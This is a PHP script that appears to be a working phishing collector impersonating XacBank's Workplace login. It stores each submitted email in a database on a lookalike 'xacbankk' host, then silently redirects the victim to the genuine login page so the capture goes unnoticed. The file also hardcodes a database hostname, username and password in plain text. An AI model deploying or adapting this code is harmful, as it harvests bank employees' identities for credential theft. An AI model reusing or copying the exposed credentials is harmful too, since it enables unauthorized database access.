<?php
session_start();
// echo "<script>window.location.href = 'https://xacbank.workplace.com/login/input/?identifier=soc%40xacbank.mn';</script>";


// Initializing variables
$email = "";
$errors = array(); 

// Connect to the database
$db_host = 'xacbankk-server.mysql.database.azure.com';
$db_user = 'okyzwjplcj';
$db_pass = '04883YR7V1S12110$';
$db_name = 'xacbankk-database';
$db_port = 3306;

// Enable SSL for the connection
$ssl_ca = './DigiCertGlobalRootCA.crt.pem'; // Replace with the correct path to your SSL CA certificate file

// Establish a secure SSL-encrypted connection to the database
$conn = mysqli_init();
mysqli_ssl_set($conn, NULL, NULL, $ssl_ca, NULL, NULL);
mysqli_real_connect($conn, $db_host, $db_user, $db_pass, $db_name, $db_port, NULL, MYSQLI_CLIENT_SSL);

if (mysqli_connect_errno()) {
    die('Failed to connect to MySQL: ' . mysqli_connect_error());
}

// REGISTER USER
if (isset($_POST['identifier'])) {
    $email = mysqli_real_escape_string($conn, $_POST['identifier']);

    if (empty($email)) {
        array_push($errors, "Email is required");
    } elseif (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
        array_push($errors, "Invalid email format");
    }

    // Use prepared statements for the INSERT query
    $query = "INSERT INTO SUGA_LLR (email) VALUES(?)";
    $stmt = mysqli_prepare($conn, $query);
    mysqli_stmt_bind_param($stmt, "s", $email);
    mysqli_stmt_execute($stmt);

    $email = $_POST['identifier'];
    header('Location: '.'https://xacbank.workplace.com/login/input/?identifier='.$email);
//     echo "<script>window.location.href = 'https://xacbank.workplace.com/login/input/?identifier=soc%40xacbank.mn';</script>";
//     header('location: index.php');
//     // https://xacbank.workplace.com/login/input/?identifier=soc%40xacbank.mn
}

// Close the database connection when you're done
mysqli_close($conn);
?>